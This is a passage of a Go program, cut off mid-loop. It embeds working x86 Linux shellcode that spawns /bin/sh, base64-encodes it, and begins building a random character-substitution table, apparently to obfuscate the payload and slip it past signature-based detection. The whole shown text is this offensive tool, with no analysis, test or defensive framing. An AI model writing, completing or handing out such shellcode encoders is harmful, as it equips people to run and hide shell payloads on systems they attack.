package main

import (
    "encoding/base64"
    "math/rand"
    "time"
)

func main() {
    // Define the shellcode to encode
    shellcode := []byte{0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80}

    // Encode the shellcode with base64
    encoded := base64.StdEncoding.EncodeToString(shellcode)

    // Create a list of random characters
    chars := make([]rune, 94)
    for i := range chars {
        chars[i] = rune(i + 33)
    }
    rand.Seed(time.Now().UnixNano())
    rand.Shuffle(len(chars), func(i, j int) {
        chars[i], chars[j] = chars[j], chars[i]
    })

    // Create a dictionary of character substitutions
    subs := make(map[rune]rune)
    for i,
